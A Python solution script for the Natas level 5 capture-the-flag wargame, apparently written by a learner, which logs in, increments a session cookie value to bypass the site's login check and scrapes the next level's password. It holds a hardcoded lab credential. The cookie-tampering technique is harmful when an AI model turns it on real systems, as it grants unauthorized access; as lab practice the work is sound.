import requests
import re

def flag(url,username,password):
    session = requests.Session()
    site = session.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    cookie_dict = session.cookies.get_dict()
    cookie_key = list(cookie_dict.keys())
    cookie_value = list(cookie_dict.values())
    headers = {
            "Cookie":cookie_key[0] + "=" + str(int(cookie_value[0]) + 1)
            }
    got_cookie = requests.get(url,auth=(username,password),headers=headers)
    flag = re.findall("password for natas6 is(.*)</div>",got_cookie.text)
    print("The flag for natas5 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas5.natas.labs.overthewire.org/"
    username = "natas5"
    password = "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD"
    flag(url,username,password)
